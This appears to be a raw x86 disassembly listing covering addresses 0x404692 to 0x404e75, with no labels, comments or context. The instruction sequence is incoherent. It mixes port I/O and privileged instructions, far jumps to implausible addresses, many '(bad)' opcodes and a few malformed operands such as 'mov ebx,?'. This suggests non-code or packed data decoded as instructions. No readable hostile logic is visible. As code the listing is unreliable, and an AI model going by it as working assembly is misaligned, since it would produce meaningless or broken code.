  404692:	jge    0x404657
  404694:	lahf   
  404695:	ins    BYTE PTR es:[edi],dx
  404696:	inc    edx
  404697:	ficom  WORD PTR [ebp+0x65]
  40469a:	sub    DWORD PTR [ebx-0x2],ebp
  40469d:	out    0xc7,al
  40469f:	ror    DWORD PTR [edi-0x1cd58033],cl
  4046a5:	out    0x94,eax
  4046a7:	push   ebp
  4046a8:	mov    fs,WORD PTR ds:0x4983341b
  4046ae:	xchg   edx,eax
  4046af:	sbb    cl,BYTE PTR [ebx-0x70489e0f]
  4046b5:	icebp  
  4046b6:	jle    0x404733
  4046b8:	push   ds
  4046b9:	sbb    DWORD PTR [ecx+0x25],ecx
  4046bc:	int    0x22
  4046be:	pop    ds
  4046bf:	in     al,dx
  4046c0:	push   ss
  4046c1:	leave  
  4046c2:	data16 jno 0x40471c
  4046c5:	inc    eax
  4046c6:	sbb    ebx,DWORD PTR [esi]
  4046c8:	enter  0x8ce8,0x96
  4046cc:	pop    ebp
  4046cd:	push   ds
  4046ce:	mov    ecx,0x81ccf783
  4046d3:	pop    ebp
  4046d4:	xchg   ecx,eax
  4046d5:	gs xchg ecx,eax
  4046d7:	pop    esp
  4046d8:	shl    edx,cl
  4046da:	push   ebx
  4046db:	xchg   esi,eax
  4046dc:	rcl    DWORD PTR [ebp+0x36],0xc2
  4046e0:	jo     0x4046f4
  4046e2:	add    bh,al
  4046e4:	xor    al,0x17
  4046e6:	mov    ah,0x6f
  4046e8:	push   edx
  4046e9:	fdivr  QWORD PTR [edi-0x2089db03]
  4046ef:	jns    0x404679
  4046f1:	in     al,0x1c
  4046f3:	fnstsw WORD PTR [esi]
  4046f5:	mov    al,0xa7
  4046f7:	xchg   ecx,eax
  4046f8:	pop    ecx
  4046f9:	pop    es
  4046fa:	fnstcw WORD PTR [edi-0x3]
  4046fd:	es mov al,0x2d
  404700:	lds    eax,FWORD PTR [ebp*2-0x65370ba6]
  404707:	xor    DWORD PTR [edx-0x7b],0x443ccce1
  40470e:	in     al,dx
  40470f:	outs   dx,DWORD PTR ds:[esi]
  404710:	adc    al,0x30
  404712:	sbb    BYTE PTR [ecx+0x4b66cd1d],ch
  404718:	(bad)  
  404719:	ins    BYTE PTR es:[edi],dx
  40471a:	out    dx,al
  40471b:	xchg   ecx,eax
  40471c:	aaa    
  40471d:	lods   eax,DWORD PTR ds:[esi]
  40471e:	xlat   BYTE PTR ds:[ebx]
  40471f:	lods   al,BYTE PTR ds:[esi]
  404720:	push   eax
  404721:	cld    
  404722:	xor    ebx,DWORD PTR [esi-0x2785d360]
  404728:	xchg   ebx,eax
  404729:	aam    0x15
  40472b:	shl    DWORD PTR [eax],0x7b
  40472e:	sbb    cl,0x71
  404731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404732:	inc    eax
  404733:	xor    eax,0x1a5fa1dd
  404738:	mov    edx,0x9340a4ae
  40473d:	jns    0x40479a
  40473f:	and    esp,edx
  404741:	test   DWORD PTR [ebx+eax*1+0x57],eax
  404745:	sub    eax,0xb48a4ca2
  40474a:	push   ebx
  40474b:	in     al,0xd0
  40474d:	and    eax,0xb9ced8b3
  404752:	and    eax,0x6daec9eb
  404757:	js     0x4047ac
  404759:	push   0x56
  40475b:	cli    
  40475c:	int    0xfa
  40475e:	or     eax,0x504f2546
  404763:	stc    
  404764:	aaa    
  404765:	jmp    0xf6d43262
  40476a:	cld    
  40476b:	retf   
  40476c:	lods   al,BYTE PTR ds:[esi]
  40476d:	lods   al,BYTE PTR ds:[esi]
  40476e:	adc    esi,DWORD PTR [ebx-0x41c548b9]
  404774:	pop    ss
  404775:	rcl    BYTE PTR [edx],0xb5
  404778:	sub    BYTE PTR [ebp-0x7f],bl
  40477b:	push   ds
  40477c:	ds jb  0x404706
  40477f:	jnp    0x4047e8
  404781:	aas    
  404782:	or     eax,0xfb1f9e6b
  404787:	es enter 0x3084,0xc0
  40478c:	mov    bl,0x20
  40478e:	js     0x40474e
  404790:	sub    eax,0xb0c5f8
  404795:	push   ecx
  404796:	add    BYTE PTR ds:0xcd6ea10e,cl
  40479c:	pop    ecx
  40479d:	int3   
  40479e:	lods   eax,DWORD PTR ds:[esi]
  40479f:	out    0xf9,al
  4047a1:	sub    DWORD PTR [esi+0x4],ebp
  4047a4:	mov    esp,0xe14e7ca0
  4047a9:	hlt    
  4047aa:	pop    ecx
  4047ab:	mov    ss,WORD PTR [eax+0x63]
  4047ae:	jnp    0x404791
  4047b0:	div    DWORD PTR fs:[eax+0x1eb25805]
  4047b7:	push   edi
  4047b8:	pop    ecx
  4047b9:	dec    esp
  4047ba:	and    bl,BYTE PTR [edi-0x2a255dec]
  4047c0:	jnp    0x40476b
  4047c2:	seto   BYTE PTR [edx+0x6d416a7d]
  4047c9:	or     esp,DWORD PTR [edi]
  4047cb:	inc    esi
  4047cc:	pop    edx
  4047cd:	outs   dx,DWORD PTR ds:[esi]
  4047ce:	ins    BYTE PTR es:[edi],dx
  4047cf:	aaa    
  4047d0:	jne    0x404828
  4047d2:	mov    ebx,0xc93b284f
  4047d7:	sti    
  4047d8:	ins    DWORD PTR es:[edi],dx
  4047d9:	dec    ecx
  4047da:	cmp    ebx,DWORD PTR [esi+eiz*2]
  4047dd:	outs   dx,DWORD PTR ds:[esi]
  4047de:	clc    
  4047df:	sbb    BYTE PTR [eax],al
  4047e1:	push   0x1fdeb188
  4047e6:	jecxz  0x40478b
  4047e8:	sti    
  4047e9:	dec    edx
  4047ea:	scas   al,BYTE PTR es:[edi]
  4047eb:	adc    DWORD PTR [ebx-0x53],ebp
  4047ee:	adc    DWORD PTR [ebx-0x30945d86],edx
  4047f4:	test   DWORD PTR [esi+0x4b],ebx
  4047f7:	and    eax,0x4a0f9daa
  4047fc:	outs   dx,BYTE PTR ds:[esi]
  4047fd:	add    ah,ah
  4047ff:	inc    esp
  404800:	adc    BYTE PTR [ecx-0x2f],bl
  404803:	sahf   
  404804:	xchg   edi,eax
  404805:	sbb    al,0x18
  404807:	jo     0x4047b4
  404809:	(bad)  
  40480a:	test   DWORD PTR [edi+0x404be708],eax
  404810:	mov    dh,0x28
  404812:	fcom   QWORD PTR [edi+ebx*8-0x3f]
  404816:	pushf  
  404817:	mov    cl,0xae
  404819:	mov    ebp,0xd34d698c
  40481e:	dec    esp
  40481f:	jmp    0x4047d9
  404821:	fwait
  404822:	test   dh,ch
  404824:	sar    DWORD PTR [ebx+eax*4+0x4],0x81
  404829:	xchg   ebp,eax
  40482a:	iret   
  40482b:	and    eax,0xf6e68bd5
  404830:	mov    WORD PTR [esi-0x14],ds
  404833:	mov    bl,0xc
  404835:	das    
  404836:	mov    ebx,0x37ae24d4
  40483b:	mov    esp,0xdf58c41e
  404840:	cld    
  404841:	leave  
  404842:	xor    dl,BYTE PTR [eax+0x5d]
  404845:	stc    
  404846:	outs   dx,BYTE PTR ds:[esi]
  404847:	xor    al,0xc1
  404849:	mov    ds:0xc25c15b9,al
  40484e:	mov    ds:0x46c970bd,al
  404853:	cmp    cl,BYTE PTR [edx+0x27a872a1]
  404859:	xchg   DWORD PTR [edx+0x499b540],ebp
  40485f:	in     eax,dx
  404860:	adc    ah,ch
  404862:	xor    edx,DWORD PTR [esi+0x68f84722]
  404868:	sbb    ch,BYTE PTR [edi+0x798af06e]
  40486e:	ins    BYTE PTR es:[edi],dx
  40486f:	jle    0x40488b
  404871:	neg    bh
  404873:	adc    bl,cl
  404875:	fisubr WORD PTR [ebp+0x57]
  404878:	lods   eax,DWORD PTR ds:[esi]
  404879:	test   al,0xef
  40487b:	sub    BYTE PTR [ecx],0x66
  40487e:	mov    BYTE PTR [esp+ecx*2-0x3b3e874a],cl
  404885:	ds add eax,0x44b49aa4
  40488b:	push   edi
  40488c:	jns    0x4048e9
  40488e:	fstp   TBYTE PTR [edi]
  404890:	ret    0xb861
  404893:	add    BYTE PTR [ebx+0x56],dl
  404896:	jo     0x404846
  404898:	in     eax,0xb6
  40489a:	mov    ebx,?
  40489c:	cmp    al,0x2b
  40489e:	shr    BYTE PTR [ebp-0x57],cl
  4048a1:	cdq    
  4048a2:	jae    0x4048a4
  4048a4:	pushf  
  4048a5:	aad    0x7c
  4048a7:	test   BYTE PTR es:[eax-0x4db975da],0xf0
  4048af:	xor    bh,0xd5
  4048b2:	dec    esp
  4048b3:	jno    0x40487d
  4048b5:	jp     0x40490f
  4048b7:	jmp    0x404857
  4048b9:	shr    BYTE PTR [ebp+0x5c5daf3b],1
  4048bf:	test   cl,bl
  4048c1:	stc    
  4048c2:	out    dx,eax
  4048c3:	call   0xa824b075
  4048c8:	imul   ecx,DWORD PTR [eax-0x19],0xd90109f7
  4048cf:	dec    esp
  4048d0:	loopne 0x404877
  4048d2:	jne    0x40486f
  4048d4:	push   esi
  4048d5:	(bad)  
  4048d6:	xor    al,0x90
  4048d8:	in     eax,0x79
  4048da:	mov    ch,0x8c
  4048dc:	jecxz  0x404913
  4048de:	pusha  
  4048df:	mov    cl,ah
  4048e1:	enter  0xa222,0x74
  4048e5:	push   edx
  4048e6:	or     BYTE PTR [ebp+eax*8-0x15f6985],bl
  4048ed:	and    eax,0x6318e190
  4048f2:	sub    cl,cl
  4048f4:	mov    esi,0xa6f40aa5
  4048f9:	aaa    
  4048fa:	jmp    0x7363:0xf4110124
  404901:	push   ecx
  404902:	fadd   QWORD PTR [edx+0x5b1c565e]
  404908:	je     0x404982
  40490a:	or     ebx,esi
  40490c:	test   eax,0xd250fdd4
  404911:	imul   ebp,ebp,0x5d97bbee
  404917:	mov    al,0x85
  404919:	or     bh,al
  40491b:	inc    ebx
  40491c:	sbb    BYTE PTR [ecx+edi*8-0x154e6979],0xa3
  404924:	mov    al,ds:0xe620b384
  404929:	fild   DWORD PTR [bx+0x7bb3]
  40492e:	push   ss
  40492f:	cmc    
  404930:	mov    ?,ecx
  404932:	ss pop esp
  404934:	ret    
  404935:	xor    DWORD PTR [edx-0x21],esp
  404938:	fistp  QWORD PTR [eax]
  40493a:	mov    bl,0x6b
  40493c:	inc    edx
  40493d:	popa   
  40493e:	push   edi
  40493f:	ins    BYTE PTR es:[edi],dx
  404940:	xlat   BYTE PTR ds:[ebx]
  404941:	jbe    0x4048f0
  404943:	(bad)  
  404944:	xchg   edx,eax
  404945:	popa   
  404946:	(bad)  
  404947:	out    0x30,al
  404949:	call   0x2977:0xcb3a0bb9
  404950:	cwde   
  404951:	mov    eax,0xd1b7bc6c
  404956:	mov    cl,BYTE PTR [edi]
  404958:	jbe    0x404937
  40495a:	mov    ah,0xd4
  40495c:	fldenv [ecx+0x4a]
  40495f:	fisubr WORD PTR [eax+edi*4+0x19e4883d]
  404966:	shr    ebx,0xb4
  404969:	pusha  
  40496a:	arpl   si,ax
  40496c:	nop
  40496d:	sub    DWORD PTR [ebx-0x6c468125],ebp
  404973:	fs dec esp
  404975:	pop    edx
  404976:	add    eax,0x4ca7d94
  40497b:	shl    BYTE PTR [edx],cl
  40497d:	(bad)  
  40497e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40497f:	aas    
  404980:	fs xor ebp,esi
  404983:	pop    ds
  404984:	push   eax
  404985:	(bad)  [ebp+0xe]
  404988:	pop    esp
  404989:	pop    edx
  40498a:	cdq    
  40498b:	dec    eax
  40498c:	fdivr  QWORD PTR [edx+0x51]
  40498f:	test   al,0xe1
  404991:	cld    
  404992:	(bad)  
  404993:	out    dx,al
  404994:	inc    edi
  404995:	cmp    eax,0x6e49223f
  40499a:	fwait
  40499b:	shl    DWORD PTR [ebp+0x207cde47],cl
  4049a1:	mov    esi,0x38745d73
  4049a6:	mov    edi,0xaa10004f
  4049ab:	sub    al,0x14
  4049ad:	test   DWORD PTR [eax+0x5e5fa60a],edi
  4049b3:	bound  ecx,QWORD PTR [ebx+0x39]
  4049b6:	mov    edi,0x3b8a446b
  4049bb:	fucomi st,st(3)
  4049bd:	in     eax,0xa9
  4049bf:	lds    eax,FWORD PTR [esi+0x3d]
  4049c2:	push   0x69679a03
  4049c7:	xchg   ebp,eax
  4049c8:	mov    edi,eax
  4049ca:	retf   
  4049cb:	in     al,dx
  4049cc:	test   eax,0xe0e78b51
  4049d1:	mov    dh,0x5e
  4049d3:	nop
  4049d4:	call   ecx
  4049d6:	sbb    edx,DWORD PTR [edx+0x7512e8ba]
  4049dc:	sbb    ebp,DWORD PTR ss:[eax+0x50]
  4049e0:	nop
  4049e1:	xor    al,0xa1
  4049e3:	inc    ecx
  4049e4:	psllq  mm4,QWORD PTR [eax-0x4e]
  4049e8:	loop   0x404a38
  4049ea:	and    eax,0x38d1ad1f
  4049ef:	add    ch,BYTE PTR [esi]
  4049f1:	ins    BYTE PTR es:[edi],dx
  4049f2:	mov    ah,0x30
  4049f4:	and    cl,bh
  4049f6:	sti    
  4049f7:	lods   eax,DWORD PTR ds:[esi]
  4049f8:	and    ebp,DWORD PTR [ebx-0xedb44d3]
  4049fe:	and    ch,cl
  404a00:	push   es
  404a01:	(bad)  
  404a02:	(bad)  
  404a03:	sbb    BYTE PTR [ebp-0x4e],ah
  404a06:	sbb    eax,0x5e2d3985
  404a0b:	inc    eax
  404a0c:	xchg   eax,esi
  404a0e:	mov    ah,0x94
  404a10:	outs   dx,DWORD PTR ds:[esi]
  404a11:	mov    esi,0x14439289
  404a16:	mov    dl,0x61
  404a18:	call   0x96336e27
  404a1d:	sub    BYTE PTR [edi+0x642ce153],bh
  404a23:	sbb    ebp,DWORD PTR [edi-0x7374d47c]
  404a29:	fdivp  st(7),st
  404a2b:	icebp  
  404a2c:	test   DWORD PTR [esi+0x4460e782],ecx
  404a32:	pop    ss
  404a33:	mov    BYTE PTR [ebx],cl
  404a35:	imul   edx,eax,0x40134a03
  404a3b:	(bad)
  404a3f:	mov    ch,0x51
  404a41:	and    esp,DWORD PTR [eax+0x4b]
  404a44:	fiadd  WORD PTR [edx+ebp*8+0x13]
  404a48:	or     BYTE PTR [esi],bh
  404a4a:	pavgb  mm5,QWORD PTR ds:[ecx]
  404a4e:	test   DWORD PTR [ebx],edi
  404a50:	imul   edx,ebx,0x64
  404a53:	xor    eax,DWORD PTR [edx-0x4039c9cf]
  404a59:	ret    
  404a5a:	mov    ecx,eax
  404a5c:	lods   al,BYTE PTR ds:[esi]
  404a5d:	xchg   esp,eax
  404a5e:	xor    al,0xf3
  404a60:	(bad)  [esi-0x4e10bd75]
  404a66:	mov    DWORD PTR [ecx],esi
  404a68:	dec    esp
  404a69:	and    eax,DWORD PTR [ebp+edi*2-0x5f2b8d2f]
  404a70:	inc    edi
  404a71:	jp     0x404ab8
  404a73:	sbb    ecx,ebx
  404a75:	mov    ds:0x3ca009e5,al
  404a7a:	add    ebp,DWORD PTR [edx+0x34]
  404a7d:	xor    edi,ebx
  404a7f:	aam    0xb9
  404a81:	cmp    al,0xbe
  404a83:	add    DWORD PTR [ecx],edx
  404a85:	mov    ah,0x2b
  404a87:	and    DWORD PTR [ecx+0x29],ebx
  404a8a:	cmc    
  404a8b:	add    ebx,DWORD PTR [edx+edi*8-0x44]
  404a8f:	mov    bl,0x57
  404a91:	cmp    bl,BYTE PTR [ecx]
  404a93:	sbb    dh,bl
  404a95:	or     eax,0xaab4c29e
  404a9a:	sub    bl,BYTE PTR [edx+0x68]
  404a9d:	xchg   edx,eax
  404a9e:	push   ecx
  404a9f:	rcl    DWORD PTR [ecx+0x510f45df],1
  404aa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aa6:	sub    edi,DWORD PTR [esi]
  404aa8:	ja     0x404a2c
  404aaa:	cmp    cl,ah
  404aac:	cmp    eax,0xadc23e2f
  404ab1:	xchg   ebx,eax
  404ab2:	xchg   edi,eax
  404ab3:	clc    
  404ab4:	sbb    BYTE PTR [eax],dl
  404ab6:	out    dx,al
  404ab7:	push   ds
  404ab8:	repz xor cl,BYTE PTR es:[ebx]
  404abc:	ja     0x404a42
  404abe:	dec    esp
  404abf:	rcl    DWORD PTR [edx],0xf9
  404ac2:	and    cl,BYTE PTR [ebp-0x701f6afb]
  404ac8:	(bad)  
  404ac9:	test   BYTE PTR [ebp+0x47734eb2],0x21
  404ad0:	push   esi
  404ad1:	dec    ebx
  404ad2:	pop    esi
  404ad3:	sbb    al,0x68
  404ad5:	add    dl,ah
  404ad7:	test   BYTE PTR [edi+edx*2],0x38
  404adb:	sbb    eax,0x16a47313
  404ae0:	add    eax,0xde498021
  404ae5:	jns    0x404b66
  404ae7:	mov    ebx,0x6c9c9d41
  404aec:	or     al,0xd2
  404aee:	mov    ds:0xf0766dbf,al
  404af3:	add    ebx,esi
  404af5:	icebp  
  404af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404af7:	bound  ecx,QWORD PTR [edx+0x39]
  404afa:	aas    
  404afb:	enter  0xe8c7,0x7d
  404aff:	cmp    al,0x4c
  404b01:	popa   
  404b02:	ret    0x3d9c
  404b05:	fsubr  DWORD PTR [ebp-0x37e5d695]
  404b0b:	mov    bl,0xbe
  404b0d:	mov    ds:0x2f245b9c,al
  404b12:	fild   WORD PTR [edx+0x40]
  404b15:	cmp    DWORD PTR [ebx],0x55ae9097
  404b1b:	imul   edx,DWORD PTR [eax],0xffffffcd
  404b1e:	repz repz pushf 
  404b21:	dec    edx
  404b22:	or     BYTE PTR ds:0x2d3c4fd9,ch
  404b28:	lock les ebx,FWORD PTR [ebp-0x1659baee]
  404b2f:	shr    BYTE PTR [edx+ecx*4-0x352610cf],0xba
  404b37:	cld    
  404b38:	mov    al,ds:0xb488c759
  404b3d:	mov    ds:0xb158827d,eax
  404b42:	mov    dl,0x5f
  404b44:	cmp    eax,0xa8ff42b3
  404b49:	xchg   ebx,eax
  404b4a:	mov    edi,0xdcdea0d9
  404b4f:	and    ah,0x35
  404b52:	or     al,cl
  404b54:	pop    edi
  404b55:	mov    ah,0x5e
  404b57:	push   cs
  404b58:	inc    ebx
  404b59:	int    0xd5
  404b5b:	cmp    eax,edx
  404b5d:	pop    esi
  404b5e:	(bad)  
  404b5f:	push   ds
  404b60:	lea    eax,[ebp+0x4f3c51d6]
  404b66:	(bad)  
  404b67:	shr    BYTE PTR [esi+0x78f59dc5],cl
  404b6d:	mov    al,ds:0x18204944
  404b72:	add    al,0x25
  404b74:	rcl    DWORD PTR [edi-0x3c],1
  404b77:	push   esi
  404b78:	cmp    eax,0x5e76d744
  404b7d:	dec    ebp
  404b7e:	ret    0xcb02
  404b81:	repnz pop esi
  404b83:	mov    ebx,0x6cf1682e
  404b88:	and    al,cl
  404b8a:	jne    0x404b8d
  404b8c:	dec    esp
  404b8d:	adc    al,0x81
  404b8f:	cmp    eax,0x63ad1d16
  404b94:	jl     0x404b83
  404b96:	and    ch,BYTE PTR [edi]
  404b98:	test   al,0x53
  404b9a:	icebp  
  404b9b:	lods   eax,DWORD PTR ds:[esi]
  404b9c:	out    0x4d,eax
  404b9e:	js     0x404ba9
  404ba0:	fbld   TBYTE PTR [ebx-0x7f]
  404ba3:	stc    
  404ba4:	inc    edi
  404ba5:	xor    DWORD PTR [ebx],esp
  404ba7:	sti    
  404ba8:	mov    ah,0xe
  404baa:	fnstsw WORD PTR [ecx+0x27]
  404bad:	dec    esp
  404bae:	popa   
  404baf:	jl     0x404b6f
  404bb1:	mov    esi,0xfa1b85e1
  404bb6:	inc    ecx
  404bb7:	or     al,0x6f
  404bb9:	loopne 0x404c31
  404bbb:	cwde   
  404bbc:	adc    cl,BYTE PTR [ebx+0x1bff7b69]
  404bc2:	adc    al,0x5
  404bc4:	xchg   edi,eax
  404bc5:	fmul   QWORD PTR [edx+0x2b29a02c]
  404bcb:	pusha  
  404bcc:	inc    esp
  404bcd:	stos   BYTE PTR es:[edi],al
  404bce:	push   ecx
  404bcf:	mov    al,ds:0x68e4d028
  404bd4:	dec    esi
  404bd5:	out    0xe7,eax
  404bd7:	stos   DWORD PTR es:[edi],eax
  404bd8:	mov    esp,0x56731c1a
  404bdd:	dec    esi
  404bde:	mov    es,ecx
  404be0:	cs inc ebx
  404be2:	out    dx,eax
  404be3:	rcl    BYTE PTR [ebx+0x582c2faf],0x17
  404bea:	(bad)  
  404beb:	ror    dl,1
  404bed:	std    
  404bee:	sar    BYTE PTR [ebp-0x1720ede3],1
  404bf4:	or     DWORD PTR [edi+eax*2],esp
  404bf7:	inc    esi
  404bf8:	fwait
  404bf9:	push   esp
  404bfb:	pop    edx
  404bfc:	inc    ebp
  404bfd:	cmp    esp,DWORD PTR [ebp+0x5e]
  404c00:	xor    DWORD PTR [esi-0x123957cf],0x7a
  404c07:	lods   al,BYTE PTR ds:[esi]
  404c08:	mov    ds,ecx
  404c0a:	add    DWORD PTR [ecx],ebp
  404c0c:	dec    ebx
  404c0d:	inc    ebp
  404c0e:	cmp    eax,0x38ad2606
  404c13:	test   DWORD PTR [edx+0x27873c6e],esi
  404c19:	dec    ecx
  404c1a:	mov    eax,ds:0xa1715b89
  404c1f:	inc    esp
  404c20:	pop    ebx
  404c21:	push   ebx
  404c22:	retf   
  404c23:	jmp    0x404c75
  404c25:	paddsb mm4,QWORD PTR [edi+0x20730a9a]
  404c2c:	pop    eax
  404c2d:	xchg   BYTE PTR [ecx-0x68404609],dl
  404c33:	mov    esi,0xd6670db2
  404c38:	and    BYTE PTR [esi],0x5f
  404c3b:	fxch   st(1)
  404c3d:	fbld   TBYTE PTR [edi+0xb]
  404c40:	or     eax,0xea98d932
  404c45:	cmp    edx,DWORD PTR [ecx+0x4c312822]
  404c4b:	xchg   edx,eax
  404c4c:	sub    bh,0xd9
  404c4f:	jg     0x404c47
  404c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c52:	xchg   ebp,eax
  404c53:	dec    ebx
  404c54:	repnz cdq 
  404c56:	mov    BYTE PTR [eax],0x53
  404c59:	ds jnp 0x404cd1
  404c5c:	popf   
  404c5d:	pop    ebp
  404c5e:	dec    BYTE PTR [edi]
  404c60:	fs rol DWORD PTR es:0x2911bd9d,cl
  404c68:	and    DWORD PTR [ebp+0x2a],ebx
  404c6b:	dec    edi
  404c6c:	std    
  404c6d:	mov    ch,0x82
  404c6f:	in     eax,dx
  404c70:	sbb    BYTE PTR [ecx-0x24],0x7d
  404c74:	mov    ecx,0x77c1f77c
  404c79:	lods   al,BYTE PTR ds:[esi]
  404c7a:	fst    QWORD PTR ds:0x2a52f1d2
  404c80:	mov    BYTE PTR [edx-0xc8bc46c],ch
  404c86:	into   
  404c87:	mov    ecx,gs
  404c89:	pop    ds
  404c8a:	sub    al,0x6f
  404c8c:	test   DWORD PTR [esi],ebx
  404c8e:	adc    al,0xcc
  404c90:	inc    ecx
  404c91:	push   ebx
  404c92:	inc    esi
  404c93:	fwait
  404c94:	(bad)  
  404c95:	pop    ds
  404c96:	push   ds
  404c97:	push   0xbab21e87
  404c9c:	in     eax,dx
  404c9d:	repz das 
  404c9f:	pop    edi
  404ca0:	add    ebx,DWORD PTR ds:0x445878d2
  404ca6:	hlt    
  404ca7:	(bad)  
  404ca9:	and    edx,DWORD PTR [edx-0x54aa6a9]
  404caf:	jle    0x404c82
  404cb1:	xchg   ebp,eax
  404cb2:	jnp    0x404c52
  404cb4:	xchg   DWORD PTR [ecx-0x38daa7ad],esp
  404cba:	(bad)  
  404cbb:	sub    esp,DWORD PTR [eax-0x47af47a6]
  404cc1:	(bad)  
  404cc2:	in     al,dx
  404cc3:	dec    edi
  404cc4:	pop    esi
  404cc5:	addr16 cmp eax,0x625bc743
  404ccb:	mov    ds:0xf5287708,al
  404cd0:	pop    edx
  404cd1:	and    BYTE PTR [ebx-0x3d],bh
  404cd4:	shl    DWORD PTR [ebx-0x79c8d45],1
  404cda:	pop    edx
  404cdb:	cld    
  404cdc:	shl    BYTE PTR [ebx],1
  404cde:	pop    esi
  404cdf:	retf   0xd211
  404ce2:	sub    eax,0xfd6bf7d2
  404ce7:	ret    
  404ce8:	jae    0x404cd2
  404cea:	leave  
  404ceb:	js     0x404cf7
  404ced:	mov    al,0x52
  404cef:	sub    BYTE PTR [esi+0x4c],ch
  404cf2:	cmp    BYTE PTR [ebx+0x28a80342],ch
  404cf8:	xor    dl,BYTE PTR [eax]
  404cfa:	scas   al,BYTE PTR es:[edi]
  404cfb:	mov    ds:0xac062113,al
  404d00:	add    ah,0x67
  404d03:	scas   al,BYTE PTR es:[edi]
  404d04:	outs   dx,BYTE PTR ds:[esi]
  404d05:	pop    edi
  404d06:	sub    cl,BYTE PTR [ebx]
  404d08:	xchg   DWORD PTR [eax],ebp
  404d0a:	getsec 
  404d0c:	push   ds
  404d0d:	push   esp
  404d0e:	or     DWORD PTR [eax-0x6a],edx
  404d11:	int    0xe
  404d13:	inc    ebp
  404d14:	enter  0xe35b,0x65
  404d18:	push   cs
  404d19:	xor    eax,0x41d12f09
  404d1e:	pop    edi
  404d1f:	aaa    
  404d20:	jge    0x404d6f
  404d22:	(bad)  
  404d23:	xor    bh,BYTE PTR [eax+0x59]
  404d26:	sub    ebp,ecx
  404d28:	outs   dx,DWORD PTR ds:[esi]
  404d29:	ja     0x404d83
  404d2b:	dec    esp
  404d2c:	pop    eax
  404d2d:	and    esi,DWORD PTR [ebx]
  404d2f:	mov    esi,DWORD PTR [edx+0x40]
  404d32:	cwde   
  404d33:	push   edi
  404d34:	adc    eax,DWORD PTR ds:0xf4688f17
  404d3a:	test   BYTE PTR [edx-0x6bed71a5],al
  404d40:	mov    al,ds:0x862fc9e
  404d45:	sar    DWORD PTR [ecx-0x4d],1
  404d48:	les    edi,FWORD PTR [eax+0x14be668c]
  404d4e:	sbb    DWORD PTR [eax],0xaa40022
  404d54:	ins    DWORD PTR es:[edi],dx
  404d55:	sbb    eax,0xf874aca0
  404d5a:	cmp    al,0x5f
  404d5c:	idiv   DWORD PTR [edx+ebx*4]
  404d5f:	xchg   esp,eax
  404d60:	mov    bl,0x19
  404d62:	mov    edx,0x71d901a3
  404d67:	pop    esp
  404d68:	dec    ebp
  404d69:	pop    edx
  404d6a:	adc    eax,0xf6377d69
  404d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d70:	jbe    0x404dda
  404d72:	mov    ecx,0x48e57287
  404d77:	mov    al,ds:0x2d863b02
  404d7c:	sar    BYTE PTR [ebp+0x7c],1
  404d7f:	nop/reserved BYTE PTR [edx]
  404d82:	jmp    0x404de9
  404d84:	shl    DWORD PTR [ecx*8+0x674db817],cl
  404d8b:	pop    ebp
  404d8c:	out    0xa7,al
  404d8e:	js     0x404dbb
  404d90:	repnz add eax,DWORD PTR [eax+0x9]
  404d94:	or     ebx,DWORD PTR ds:[eax]
  404d97:	pop    esi
  404d98:	cli    
  404d99:	lock mov eax,ds:0x6166c2ca
  404d9f:	mov    esi,0xc24bf584
  404da4:	aaa    
  404da5:	jecxz  0x404e19
  404da7:	or     dl,dl
  404da9:	pusha  
  404daa:	iret   
  404dab:	jbe    0x404e22
  404dad:	retf   0x712a
  404db0:	fwait
  404db1:	xchg   edx,eax
  404db2:	(bad)  
  404db3:	leave  
  404db4:	ss xor bh,0xcd
  404db8:	jb     0x404d57
  404dba:	sub    eax,0xe77ebc74
  404dbf:	call   0x3776e6d5
  404dc4:	retf   
  404dc5:	xor    BYTE PTR [esi-0x5a],bl
  404dc8:	pop    esp
  404dc9:	adc    al,0xd7
  404dcb:	call   0xeaf2:0x6c05c55d
  404dd2:	jb     0x404dea
  404dd4:	add    BYTE PTR [ecx],ah
  404dd6:	rol    ch,cl
  404dd8:	dec    ecx
  404dd9:	scas   eax,DWORD PTR es:[edi]
  404dda:	xor    BYTE PTR [edi-0x24d8cf81],dh
  404de0:	add    eax,0xc39043e9
  404de5:	xchg   ecx,eax
  404de6:	push   0xffffffc9
  404de8:	sbb    al,0xe3
  404dea:	and    edi,ebp
  404dec:	adc    al,BYTE PTR [esi+0x24a46084]
  404df2:	fisub  WORD PTR [ecx-0x6d362506]
  404df8:	mov    bh,0x59
  404dfa:	addr16 dec eax
  404dfc:	push   0xffffffeb
  404dfe:	inc    eax
  404dff:	ror    BYTE PTR [edx+ebx*8-0x57cfc8e0],1
  404e06:	mov    ecx,0x31494731
  404e0b:	idiv   DWORD PTR [ecx-0x50c8159d]
  404e11:	test   al,0xb2
  404e13:	push   0xffffff8b
  404e15:	sub    dh,BYTE PTR [edi-0x78]
  404e18:	xchg   edx,eax
  404e19:	adc    bh,BYTE PTR [edi-0x76]
  404e1c:	stos   BYTE PTR es:[edi],al
  404e1d:	out    0x33,eax
  404e1f:	or     al,0x81
  404e21:	in     al,dx
  404e22:	into   
  404e23:	dec    ecx
  404e24:	jb     0x404df2
  404e26:	push   0xffffffdb
  404e28:	cdq    
  404e29:	push   0x1b
  404e2b:	mov    ebp,0x7e47f764
  404e30:	push   esi
  404e31:	addr16 add al,0xc1
  404e34:	or     eax,0xd6d4b47e
  404e39:	inc    DWORD PTR [ebx-0x2c]
  404e3c:	xor    bh,BYTE PTR [eax+0x7b]
  404e3f:	or     esi,DWORD PTR [ebp*8+0x5a836765]
  404e46:	jb     0x404ebe
  404e48:	xchg   esi,eax
  404e49:	sbb    eax,0x82a82007
  404e4e:	scas   al,BYTE PTR es:[edi]
  404e4f:	mov    gs,esi
  404e51:	push   esp
  404e52:	fucomi st,st(7)
  404e54:	out    dx,al
  404e55:	scas   al,BYTE PTR es:[edi]
  404e56:	shr    DWORD PTR [edi],cl
  404e58:	out    0x5f,al
  404e5a:	pushf  
  404e5b:	cmp    eax,0xb4b11408
  404e60:	mov    eax,0x6dd0ec3
  404e65:	daa    
  404e66:	test   eax,0x29da7404
  404e6b:	loop   0x404ee0
  404e6d:	sub    ah,BYTE PTR [edi+ebp*2-0x1da8bc8c]
  404e74:	xchg   ebp,eax
  404e75:	jmp    0xf463:0x5f95e854
